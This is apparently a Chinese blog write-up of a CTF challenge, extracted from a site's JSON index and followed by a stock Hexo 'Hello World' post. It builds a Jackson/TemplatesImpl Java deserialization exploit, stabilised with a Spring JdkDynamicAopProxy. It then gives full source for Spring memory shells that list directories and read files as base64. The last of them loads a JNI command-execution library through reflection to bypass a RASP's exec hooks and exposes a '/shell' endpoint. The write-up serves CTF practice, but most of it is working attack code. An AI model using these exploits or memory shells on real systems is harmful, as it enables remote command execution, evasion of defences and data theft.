(com.fasterxml.jackson.databind)defaultSerializeValue:1142, SerializerProvider (com.fasterxml.jackson.databind)serialize:115, POJONode (com.fasterxml.jackson.databind.node)serialize:39, SerializableSerializer (com.fasterxml.jackson.databind.ser.std)serialize:20, SerializableSerializer (com.fasterxml.jackson.databind.ser.std)_serialize:480, DefaultSerializerProvider (com.fasterxml.jackson.databind.ser)serializeValue:319, DefaultSerializerProvider (com.fasterxml.jackson.databind.ser)serialize:1518, ObjectWriter$Prefetch (com.fasterxml.jackson.databind)_writeValueAndClose:1219, ObjectWriter (com.fasterxml.jackson.databind)writeValueAsString:1086, ObjectWriter (com.fasterxml.jackson.databind)nodeToString:30, InternalNodeMapper (com.fasterxml.jackson.databind.node)toString:136, BaseJsonNode (com.fasterxml.jackson.databind.node) 这里就是第一次决定getters顺序 随后通过getDeclaredMethods 获取方法，那这里获取方法的顺序是不固定的。 并且，在com.fasterxml.jackson.databind.SerializerProvider#findTypedValueSerializer方法里，会将获取的方法顺序进行缓存，之前提到过了，缓存后会进入其它if。 因此第一次打不通，之后也无法打通了 为什么顺序不一定获取顺序是根据地址的大小来排序的，期间存在内存free的动作，那地址是不会一直线性变化的，之所以不按照字母排序，主要还是为了速度考虑，根据地址排序是最快的。 是反射 getDeclaredMethods 获取到方法的顺序是不确定的，最终导致执行相关getter方法的顺序也是不确定的，当 TemplatesImpl 的 getStylesheetDOM 方法先于 getOutputProperties 方法执行时就会导致空指针异常从而导致调用链报错中断，exp利用失败。 解决方法😊org.springframework.aop.framework.JdkDynamicAopProxy解决问题 实现众所周知,java有个b玩意叫做动态代理,很nb,👴只在cc中用过,不清楚. 12345678910111213141516171819202122232425262728293031323334353637383940414243444546package org.example;import java.lang.reflect.InvocationHandler;import java.lang.reflect.Method;import java.lang.reflect.Proxy;public class Test &#123; public static void main(String[] args) &#123; Object myProxy = Proxy.newProxyInstance(TestProxy.class.getClassLoader(), new Class[]&#123;TestInterface1.class, TestInterface2.class&#125;, new MyHandler()); for(Method m: myProxy.getClass().getDeclaredMethods()) &#123; System.out.println(m.getName()); &#125; &#125;&#125;interface TestInterface1 &#123; public void say();&#125;interface TestInterface2 &#123; public void test();&#125;class TestProxy &#123; public void eat() &#123; System.out.println(&quot;eat something&quot;); &#125; public void say() &#123; System.out.println(&quot;say something&quot;); &#125; public String getName(String a) &#123; return a; &#125;&#125;class MyHandler implements InvocationHandler &#123; @Override public Object invoke(Object proxy, Method method, Object[] args) throws Throwable &#123; System.out.println(&quot;invoke dynamic proxy handler&quot;); return null; &#125;&#125; 这是执行结果,可以看懂能获取到的方法,完全取决于接口实现了哪些方法 而 javax.xml.transform.Templates 接口其只有 newTransformer 和 getOutputProperties 这个两个方法，让他作为我们代理所需的接口，这样最终通过 getDeclaredMethods 获取到的方法就只有 newTransformer 和 getOutputProperties 了，那么最终获得的getter方法便只有 getOutputProperties 了。 因此只需要挂代理,就只会获取接口方法 12345678910111213141516171819202122232425262728293031323334353637383940414243444546package org.example;import javax.xml.transform.Templates;import java.lang.reflect.InvocationHandler;import java.lang.reflect.Method;import java.lang.reflect.Proxy;public class Test &#123; public static void main(String[] args) &#123; Object myProxy = Proxy.newProxyInstance(TestProxy.class.getClassLoader(), new Class[]&#123;Templates.class&#125;, new MyHandler()); for(Method m: myProxy.getClass().getDeclaredMethods()) &#123; System.out.println(m.getName()); &#125; &#125;&#125;interface TestInterface1 &#123; public void say();&#125;interface TestInterface2 &#123; public void test();&#125;class TestProxy &#123; public void eat() &#123; System.out.println(&quot;eat something&quot;); &#125; public void say() &#123; System.out.println(&quot;say something&quot;); &#125; public String getName(String a) &#123; return a; &#125;&#125;class MyHandler implements InvocationHandler &#123; @Override public Object invoke(Object proxy, Method method, Object[] args) throws Throwable &#123; System.out.println(&quot;invoke dynamic proxy handler&quot;); return null; &#125;&#125; 这两个方法是Templates里面定义的接口方法 JdkDynamicAopProxy 是 Spring 框架中的一个类，它实现了 JDK 动态代理机制，用于创建代理对象来实现面向切面编程（AOP）的功能。 这里能够控制advised 这里会触发反射方法,这里advised前面说过了可控 我们将所需的 TemplatesImpl 的对象用 org.springframework.aop.framework.AdvisedSupport 封装即可 1234Object oldProxy = null; boolean setProxyContext = false; TargetSource targetSource = this.advised.targetSource; Object target = null; 构造12345678Class&lt;?&gt; clazz = Class.forName(&quot;org.springframework.aop.framework.JdkDynamicAopProxy&quot;);Constructor&lt;?&gt; cons = clazz.getDeclaredConstructor(AdvisedSupport.class);cons.setAccessible(true);AdvisedSupport advisedSupport = new AdvisedSupport();advisedSupport.setTarget(templatesImpl);InvocationHandler handler = (InvocationHandler) cons.newInstance(advisedSupport);Object proxyObj = Proxy.newProxyInstance(clazz.getClassLoader(), new Class[]&#123;Templates.class&#125;, handler);POJONode jsonNodes = new POJONode(proxyObj); 👴の最後のエクスプロイト 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899import com.fasterxml.jackson.databind.node.POJONode;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import javassist.ClassPool;import javassist.CtClass;import javassist.CtConstructor;import com.fasterxml.jackson.databind.node.BaseJsonNode;import javax.management.BadAttributeValueExpException;import java.io.*;import java.lang.reflect.Field;import java.nio.file.Files;import java.nio.file.Paths;import java.util.Base64;public class exp &#123; public static void main(String[] args)throws Exception&#123;// ClassPool classPool = ClassPool.getDefault();// CtClass ctClass = classPool.get(evilref.class.getName());// CtClass superClass = classPool.get(AbstractTranslet.class.getName());// ctClass.setSuperclass(superClass);//// CtConstructor constructor = new CtConstructor(new CtClass[]&#123;&#125;,ctClass);//// constructor.setBody(&quot;Runtime.getRuntime().exec(\\&quot;calc\\&quot;);&quot;);//// ctClass.addConstructor(constructor); //byte[][] codes = new byte[][]&#123;code&#125;; TemplatesImpl templates = new TemplatesImpl(); ref(templates, &quot;_bytecodes&quot;, new byte[][]&#123;&#125;); ref(templates, &quot;_name&quot;, &quot;shanghe&quot;); ref(templates, &quot;_tfactory&quot;, new TransformerFactoryImpl()); POJONode jsonNodes = new POJONode(templates); BadAttributeValueExpException exp = new BadAttributeValueExpException(null); Field val = Class.forName(&quot;javax.management.BadAttributeValueExpException&quot;).getDeclaredField(&quot;val&quot;); val.setAccessible(true); val.set(exp,jsonNodes); serialize_func.serialize(exp); WriteToFileExample(serialize_func.encryptToBase64(&quot;ser.bin&quot;)); &#125; public static void WriteToFileExample(String args) &#123; String content = &quot;这是要写入文件的字符串内容&quot;; try &#123; BufferedWriter writer = new BufferedWriter(new FileWriter(&quot;output.txt&quot;)); writer.write(args); writer.close(); System.out.println(&quot;字符串已成功写入文件。&quot;); &#125; catch (IOException e) &#123; System.out.println(&quot;写入文件时发生错误：&quot; + e.getMessage()); &#125; &#125; public static void ref(Object obj,String field,Object value) throws NoSuchFieldException, IllegalAccessException &#123; Field reffield = obj.getClass().getDeclaredField(field); reffield.setAccessible(true); reffield.set(obj,value); &#125; public static String serial(Object o) throws IOException, NoSuchFieldException&#123; ByteArrayOutputStream baos = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(baos); oos.writeObject(o); oos.close(); String base64String = Base64.getEncoder().encodeToString(baos.toByteArray()); return base64String; &#125; public static void deserial(String data) throws Exception &#123; byte[] base64decodedBytes = Base64.getDecoder().decode(data); ByteArrayInputStream bais = new ByteArrayInputStream(base64decodedBytes); ObjectInputStream ois = new ObjectInputStream(bais); ois.readObject(); ois.close(); &#125;&#125; 内存🐎的使用🥵👴捏麻麻滴,太复杂了,还要写个内存马找到RASP,还好👴技高一筹. 列目录nm,跟喝大了一样,整这b玩意,艹😡 首先来一个递归列出所有目录文件的 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485import com.sun.org.apache.xalan.internal.xsltc.DOM;import com.sun.org.apache.xalan.internal.xsltc.TransletException;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;import com.sun.org.apache.xml.internal.serializer.SerializationHandler;import org.springframework.http.*;import org.springframework.web.bind.annotation.GetMapping;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.RequestParam;import org.springframework.web.context.WebApplicationContext;import org.springframework.web.context.request.RequestContextHolder;import org.springframework.web.servlet.mvc.method.RequestMappingInfo;import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import java.io.File;import java.io.FileInputStream;import java.io.IOException;import java.lang.reflect.Field;import java.lang.reflect.Method;import java.nio.file.Files;import java.nio.file.Path;import java.nio.file.Paths;import java.util.Base64;public class exls extends AbstractTranslet &#123; @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123; &#125; @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123; &#125; static&#123; try&#123; WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;, 0); RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class); Field configField = mappingHandlerMapping.getClass().getDeclaredField(&quot;config&quot;); configField.setAccessible(true); RequestMappingInfo.BuilderConfiguration config = (RequestMappingInfo.BuilderConfiguration) configField.get(mappingHandlerMapping); Method readmethod = exls.class.getMethod(&quot;ls&quot;, HttpServletRequest.class,HttpServletResponse.class); RequestMappingInfo info = RequestMappingInfo.paths(&quot;/ls&quot;).options(config).build(); exls readfile_inject = new exls(); mappingHandlerMapping.registerMapping(info,readfile_inject,readmethod); &#125;catch (Exception e)&#123; e.printStackTrace(); &#125; &#125; public static void ls(HttpServletRequest request,HttpServletResponse response) throws IOException &#123; String rootDirectory = request.getParameter(&quot;dir&quot;); // 替换为你的根目录路径 listFilesAndDirectories(new File(rootDirectory),response); response.getWriter().flush(); &#125; public static void listFilesAndDirectories(File directory,HttpServletResponse response) throws IOException &#123; File[] files = directory.listFiles(); if (files != null) &#123; for (File file : files) &#123; if (file.isFile()) &#123; response.getWriter().write(&quot;File: &quot; + file.getAbsolutePath()); &#125; else if (file.isDirectory()) &#123; response.getWriter().write(&quot;Directory: &quot; + file.getAbsolutePath()); listFilesAndDirectories(file,response); // 递归遍历子目录 &#125; &#125; &#125; &#125; &#125; 这样的缺点是列出根目录的时候太多杂碎的东西,👴看不动,要不是👴知道&#x2F;home下面有东西,这玩意太难找了. 优化一下 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182import com.sun.org.apache.xalan.internal.xsltc.DOM;import com.sun.org.apache.xalan.internal.xsltc.TransletException;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;import com.sun.org.apache.xml.internal.serializer.SerializationHandler;import org.springframework.http.*;import org.springframework.web.bind.annotation.GetMapping;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.RequestParam;import org.springframework.web.context.WebApplicationContext;import org.springframework.web.context.request.RequestContextHolder;import org.springframework.web.servlet.mvc.method.RequestMappingInfo;import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import java.io.File;import java.io.FileInputStream;import java.io.IOException;import java.lang.reflect.Field;import java.lang.reflect.Method;import java.nio.file.Files;import java.nio.file.Path;import java.nio.file.Paths;import java.util.Base64;public class exls extends AbstractTranslet &#123; @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123; &#125; @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123; &#125; static&#123; try&#123; WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;, 0); RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class); Field configField = mappingHandlerMapping.getClass().getDeclaredField(&quot;config&quot;); configField.setAccessible(true); RequestMappingInfo.BuilderConfiguration config = (RequestMappingInfo.BuilderConfiguration) configField.get(mappingHandlerMapping); Method readmethod = exls.class.getMethod(&quot;ls1&quot;, HttpServletRequest.class,HttpServletResponse.class); RequestMappingInfo info = RequestMappingInfo.paths(&quot;/ls1&quot;).options(config).build(); exls readfile_inject = new exls(); mappingHandlerMapping.registerMapping(info,readfile_inject,readmethod); &#125;catch (Exception e)&#123; e.printStackTrace(); &#125; &#125; public static void ls1(HttpServletRequest request,HttpServletResponse response) throws IOException &#123; String rootDirectory = request.getParameter(&quot;dir&quot;); // 替换为你的根目录路径 listFilesAndDirectories(new File(rootDirectory),response); response.getWriter().flush(); &#125; public static void listFilesAndDirectories(File directory,HttpServletResponse response) throws IOException &#123; File[] files = directory.listFiles(); if (files != null) &#123; for (File file : files) &#123; if (file!=null) &#123; response.getWriter().write(file.getAbsolutePath()+&quot;\\r\\n&quot;); &#125; &#125; &#125; &#125; &#125; 这样看起来舒服多了,👴很中意😊 读文件👴想尝试柏璐杯的代码,直接通过ResponseEntity下载文件,很可惜,失败了,但是涉及到二进制文件的读取,怎么办,👴用base64读出来,👴真tm是完美天才的idol(bushi) 终于👴想明白了一件事,写出了内存🐎 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576import com.sun.org.apache.xalan.internal.xsltc.DOM;import com.sun.org.apache.xalan.internal.xsltc.TransletException;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;import com.sun.org.apache.xml.internal.serializer.SerializationHandler;import org.springframework.http.*;import org.springframework.web.bind.annotation.GetMapping;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.RequestParam;import org.springframework.web.context.WebApplicationContext;import org.springframework.web.context.request.RequestContextHolder;import org.springframework.web.servlet.mvc.method.RequestMappingInfo;import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import java.io.FileInputStream;import java.io.IOException;import java.lang.reflect.Field;import java.lang.reflect.Method;import java.nio.file.Files;import java.nio.file.Path;import java.nio.file.Paths;import java.util.Base64;public class exre extends AbstractTranslet &#123; @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123; &#125; @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123; &#125; static&#123; try&#123; WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;, 0); RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class); Field configField = mappingHandlerMapping.getClass().getDeclaredField(&quot;config&quot;); configField.setAccessible(true); RequestMappingInfo.BuilderConfiguration config = (RequestMappingInfo.BuilderConfiguration) configField.get(mappingHandlerMapping); Method readmethod = exre.class.getMethod(&quot;readfile2&quot;, HttpServletRequest.class,HttpServletResponse.class); RequestMappingInfo info = RequestMappingInfo.paths(&quot;/readfile2&quot;).options(config).build(); exre readfile_inject = new exre(); mappingHandlerMapping.registerMapping(info,readfile_inject,readmethod); &#125;catch (Exception e)&#123; e.printStackTrace(); &#125; &#125; public void readfile2(HttpServletRequest request, HttpServletResponse response) throws IOException &#123; String filePath = request.getParameter(&quot;filepath&quot;); if(filePath!=null)&#123; FileInputStream fileInputStream = new FileInputStream(filePath); byte[] fileBytes = new byte[fileInputStream.available()]; fileInputStream.read(fileBytes); fileInputStream.close(); String base64String = Base64.getEncoder().encodeToString(fileBytes); response.getWriter().write(base64String); response.getWriter().flush(); &#125; &#125;&#125; 什么,你说你不会base64转成二进制文件?🤣 自己写个脚本转换都行,👴告诉你,还能上cyberchef转换,还能导出为文件😅 RASP😅😡绕过content-length就简单了?8可能! nmb甚至有RASP,√Ⅷ,👴没学过. 啥事RASP在2012年的时候，Gartner引入了Runtime application self-protection一词，简称为RASP。它是一种新型应用安全保护技术，它将保护程序像疫苗一样注入到应用程序中，应用程序融为一体，能实时检测和阻断安全攻击，使应用程序具备自我保护能力，当应用程序遭受到实际攻击伤害，就可以自动对其进行防御，而不需要进行人工干预。 RASP技术可以快速的将安全防御功能整合到正在运行的应用程序中，它拦截从应用程序到系统的所有调用，确保它们是安全的，并直接在应用程序内验证数据请求。Web和非Web应用程序都可以通过RASP进行保护。该技术不会影响应用程序的设计，因为RASP的检测和保护功能是在应用程序运行的系统上运行的。 👴说人话:就是nm把内存过滤,实时动态防护.别人叫内存马,你叫内存盾. 至于这玩意,👴就不在这里赘述了,先等👴新开个文章,记录一下RASP的学习笔记. 👴回来了,到了最后的步骤了.,看👴绕过这该死的RASP. 通过java-agent插桩技术,hook住了一些底层的类,使得java的exec不能够执行 一般是unix或这forkandexec forkAndExec 通常是与操作系统进程管理相关的操作，用于在类Unix操作系统中（如Linux）创建子进程并在子进程中执行指定的程序。 可恶的RASP hook住了这些类 甚至还不让本地JNI加载了,loadLibrary0也被hook了 解决方案😒底层的native方法 java.lang.ClassLoader.NativeLibrary#load 并未被hook，并且反射也是可以正常使用的，所以可以尝试使用反射来调用 java.lang.ClassLoader.NativeLibrary 中的 load 方法来加载恶意so文件执行命令 船新姿势之javah 可以,我就喜欢h😊 javah 是 Java 开发工具包 (JDK) 提供的一个命令行工具，用于生成 Java 类的本地方法接口 (Native Method Interface, JNI) 头文件。JNI 允许 Java 代码与本地（通常是C或C++）代码进行交互，这在某些情况下非常有用，例如与硬件交互或与现有的本地库进行集成。 编写包含本地方法声明的 Java 类，使用 native 关键字声明本地方法。 123public class EvilClass &#123; public static native String execCmd(String cmd);&#125; 然后使用javac编译成class,然后使用javah编译成h文件 12javah -jni EvilClass 生成的EvilClass.h如下 12345678910111213141516171819202122/* DO NOT EDIT THIS FILE - it is machine generated */#include &lt;jni.h&gt;/* Header for class EvilClass */#ifndef _Included_EvilClass#define _Included_EvilClass#ifdef __cplusplusextern &quot;C&quot; &#123;#endif/* * Class: EvilClass * Method: execCmd * Signature: (Ljava/lang/String;)Ljava/lang/String; */JNIEXPORT jstring JNICALL Java_EvilClass_execCmd (JNIEnv *, jclass, jstring);#ifdef __cplusplus&#125;#endif#endif 接下来还要根据这个h文件写C文件,nm👴不会c 1234567891011121314151617int execmd(const char *cmd, char *result)&#123; char buffer[1024*12]; //定义缓冲区 FILE *pipe = popen(cmd, &quot;r&quot;); //打开管道，并执行命令 if (!pipe) return 0; //返回0表示运行失败 while (!feof(pipe)) &#123; if (fgets(buffer, 128, pipe)) &#123; //将管道输出到result中 strcat(result, buffer); &#125; &#125; pclose(pipe); //关闭管道 return 1; //返回1表示运行成功&#125; 这里开启了一个缓冲区,popen是C中执行命令时打开的一个管道,以只读模式打开.如果为空,则命令执行失败,返回. 同时while使用feof检测pipe状态,未结束就持续从pipe里面每次最大获取128个字节内容,放到缓冲区,然后将结果追加到result中. 随后 123456789101112131415161718JNIEXPORT jstring JNICALL Java_EvilClass_execCmd(JNIEnv *env, jclass class_object, jstring jstr)&#123; const char *cstr = (*env)-&gt;GetStringUTFChars(env, jstr, NULL); // 获取 Java 字符串 jstr 的 UTF-8 编码 char result[1024 * 12] = &quot;&quot;; // 定义一个存放命令执行结果的字符数组 if (1 == execmd(cstr, result)) // 调用之前定义的 execmd 函数来执行系统命令 &#123; // 如果命令执行成功，你可以在这里进行一些处理，但代码中被注释掉了 &#125; char return_messge[100] = &quot;&quot;; // 定义一个存放返回消息的字符数组 strcat(return_messge, result); // 将命令执行结果追加到返回消息 jstring cmdresult = (*env)-&gt;NewStringUTF(env, return_messge); // 创建一个 Java 字符串，用于存储返回消息 return cmdresult; // 返回 Java 字符串，包含命令执行结果&#125; JNI规范JNI原型函数： JNI规范定义了一组标准的JNI函数原型，如GetStringUTFChars、ReleaseStringUTFChars等，以方便操作字符串、数组、引用等常见任务。 JNI函数命名规范： JNI函数的命名必须遵循特定的命名规范，通常是Java类名（用下划线替代点号）后跟Java方法名。例如，Java类com.example.MyClass中的方法myNativeFunction对应的JNI函数应为Java_com_example_MyClass_myNativeFunction。 JNIEnv指针： JNI函数的第一个参数是一个JNIEnv指针，它是一个关于JNI环境的上下文。通过JNIEnv，JNI函数可以访问Java虚拟机的各种功能，如对象创建、方法调用和异常处理。 数据类型转换： JNI定义了各种数据类型的对应关系，以便Java和本地代码之间的数据传递。例如，Java的int对应JNI的jint，Java的String对应JNI的jstring等。JNI函数允许在这些数据类型之间进行转换。 从参数上看:它接受三个参数：JNIEnv *env（JNI 环境指针）、jclass class_object（表示 Java 类的类对象）、jstring jstr（一个 Java 字符串）。 通过 (*env)-&gt;GetStringUTFChars 函数将 Java 字符串 jstr 转换为 C 字符串 cstr，这是因为 execmd 函数需要接受 C 字符串作为参数。 中间执行命令,存储. 使用 (*env)-&gt;NewStringUTF 函数创建一个新的 Java 字符串 cmdresult，用于存储返回消息。 将两部分放在一起,形成c文件,然后编译 编译: 12gcc -FPIC -I /home/siroha/java8202/include -I /home/siroha/java8202/include/linux -shared -o libcmd.so ./EvilClass.cbase64 -w 0 libcmd.so &gt; Evil.txt 写文件的操作 1234RandomAccessFile randomAccessFile = new RandomAccessFile(LIB_PATH, &quot;rw&quot;); randomAccessFile.write(jniBytes); randomAccessFile.close(); 最终写个load的内存🐎 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798import com.sun.org.apache.xalan.internal.xsltc.DOM;import com.sun.org.apache.xalan.internal.xsltc.TransletException;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;import com.sun.org.apache.xml.internal.serializer.SerializationHandler;import org.springframework.web.context.WebApplicationContext;import org.springframework.web.context.request.RequestContextHolder;import org.springframework.web.servlet.mvc.method.RequestMappingInfo;import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import java.io.IOException;import java.io.RandomAccessFile;import java.lang.reflect.Constructor;import java.lang.reflect.Field;import java.lang.reflect.Method;import java.util.Base64;import java.util.Vector;public class EvilClass extends AbstractTranslet &#123; public static native String execCmd(String cmd); private static final String EVIL_JNI_BASE64 = &quot;&quot;;//👴就不放在这里了,太长了,自己生成 private static final String LIB_PATH = &quot;/tmp/libcmd.so&quot;; static &#123; try&#123; byte[] jniBytes = Base64.getDecoder().decode(EVIL_JNI_BASE64); RandomAccessFile randomAccessFile = new RandomAccessFile(LIB_PATH, &quot;rw&quot;); randomAccessFile.write(jniBytes); randomAccessFile.close(); //调用java.lang.ClassLoader$NativeLibrary类的load方法加载动态链接库 ClassLoader cmdLoader = EvilClass.class.getClassLoader(); Class&lt;?&gt; classLoaderClazz = Class.forName(&quot;java.lang.ClassLoader&quot;); Class&lt;?&gt; nativeLibraryClazz = Class.forName(&quot;java.lang.ClassLoader$NativeLibrary&quot;); Method load = nativeLibraryClazz.getDeclaredMethod(&quot;load&quot;, String.class, boolean.class); load.setAccessible(true); Field field = classLoaderClazz.getDeclaredField(&quot;nativeLibraries&quot;); field.setAccessible(true); Vector&lt;Object&gt; libs = (Vector&lt;Object&gt;) field.get(cmdLoader); Constructor&lt;?&gt; nativeLibraryCons = nativeLibraryClazz.getDeclaredConstructor(Class.class, String.class, boolean.class); nativeLibraryCons.setAccessible(true); Object nativeLibraryObj = nativeLibraryCons.newInstance(EvilClass.class, LIB_PATH, false); libs.addElement(nativeLibraryObj); field.set(cmdLoader, libs); load.invoke(nativeLibraryObj, LIB_PATH, false); //写入内存马 WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;, 0); RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class); Field configField = mappingHandlerMapping.getClass().getDeclaredField(&quot;config&quot;); configField.setAccessible(true); RequestMappingInfo.BuilderConfiguration config = (RequestMappingInfo.BuilderConfiguration) configField.get(mappingHandlerMapping); Method method2 = EvilClass.class.getMethod(&quot;shell&quot;, HttpServletRequest.class, HttpServletResponse.class); RequestMappingInfo info = RequestMappingInfo.paths(&quot;/shell&quot;) .options(config) .build(); EvilClass springControllerMemShell = new EvilClass(); mappingHandlerMapping.registerMapping(info, springControllerMemShell, method2); &#125;catch (Exception e)&#123; e.printStackTrace(); &#125; &#125; public void shell(HttpServletRequest request, HttpServletResponse response) throws IOException &#123; String cmd = request.getParameter(&quot;cmd&quot;); if (cmd != null) &#123; String execRes = EvilClass.execCmd(cmd); response.getWriter().write(execRes); response.getWriter().flush(); &#125; &#125; @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123; &#125; @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123; &#125;&#125; NativeLibrary包装到Vector,Vector是Classloader中nativeLibraries的值, 一般来说用 1234System.loadLibrary(&quot;cmd&quot;); Command command = new Command(); String ipconfig = command.exec(&quot;ipconfig&quot;); System.out.println(ipconfig); 题目ban了. 芜湖,真√Ⅷ爽,√Ⅷ真爽,终出了. 捏麻麻地,👴花了几天时间,学了一堆东西. 怎么制作链子,怎么python发包,👴在前面已经分析过了.不用问了😅","path":"2023/11/30/DAS0RAYSxCBCTF复现/","date":"11-30","excerpt":"","tags":[]},{"title":"Hello World","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new &quot;My New Post&quot; More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","path":"2023/11/29/hello-world/","date":"11-29","excerpt":"","tags":[]}],"categories":[],"tags":[]}